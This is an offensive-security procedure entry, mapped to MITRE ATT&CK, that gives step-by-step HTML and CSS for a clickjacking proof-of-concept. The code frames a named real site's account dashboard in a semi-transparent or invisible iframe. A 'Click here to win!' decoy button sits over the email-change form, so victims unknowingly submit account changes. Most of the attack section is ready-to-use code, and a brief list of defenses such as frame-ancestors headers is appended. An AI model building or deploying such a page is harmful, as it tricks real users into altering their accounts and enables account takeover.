---
id: proc-create-clickjacking-poc
tags:
  - clickjacking
  - poc
  - html-iframe
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:05.359Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create Clickjacking Proof-of-Concept HTML Page

## Summary

This procedure creates a malicious HTML page that embeds a vulnerable target site in an iframe, using CSS overlays and sandbox attributes to demonstrate clickjacking by tricking users into interacting with hidden elements.

## Description

The PoC simulates an attacker's phishing page where the target's dashboard (e.g., Gener8 account page) is framed invisibly or semi-transparently. Sandbox attributes allow scripts, navigation, and same-origin access while positioning overlays over sensitive UI elements like email change buttons. This enables deception, such as prompting a 'prize claim' click that actually submits an email update form. The iframe is sized to 500x500 pixels for precise overlay alignment. Expected outcome: A functional demo showing unintended actions triggered via the frame.

## Requirements

1. Text editor (e.g., VS Code, Notepad)
2. Local web server or file:// access in browser
3. Knowledge of HTML, CSS, and iframe attributes

## Defense

Defensive measures and detection strategies:

- Enforce strict X-FRAME-OPTIONS and CSP frame-ancestors
- Educate users on phishing via overlays and unexpected prompts
- Detect via client-side scripts monitoring for unauthorized iframes

## Objectives

1. Embed target page in controllable iframe
2. Overlay deceptive elements for click hijacking
3. Enable interaction like form submissions

## Instructions

### Step 1: Write the HTML Structure

**Context**: Define the basic HTML with iframe embedding the target URL and sandbox for permissions.

Create 'hack.html' with this core content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
</head>
<body>
    <iframe sandbox="allow-top-navigation allow-scripts allow-same-origin" src="https://gener8ads.com/dashboard/account" width="500" height="500"></iframe>
</body>
</html>
```

> The sandbox allows necessary interactions; adjust src to the vulnerable page.

### Step 2: Add CSS Overlay

**Context**: Style the iframe and add an overlay button positioned over target elements (e.g., email form at approx. 100px top, 200px left).

Append styles and overlay:

```html
<style>
    iframe { position: absolute; top: 0; left: 0; opacity: 0.5; width: 500px; height: 500px; }
    .overlay { position: absolute; top: 100px; left: 200px; z-index: 1; }
</style>
<h1>Click here to win!</h1>
<button class="overlay">Claim Prize</button>
```

> Opacity can be set to 0 for invisible framing; z-index ensures overlay is clickable first.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[poc]]
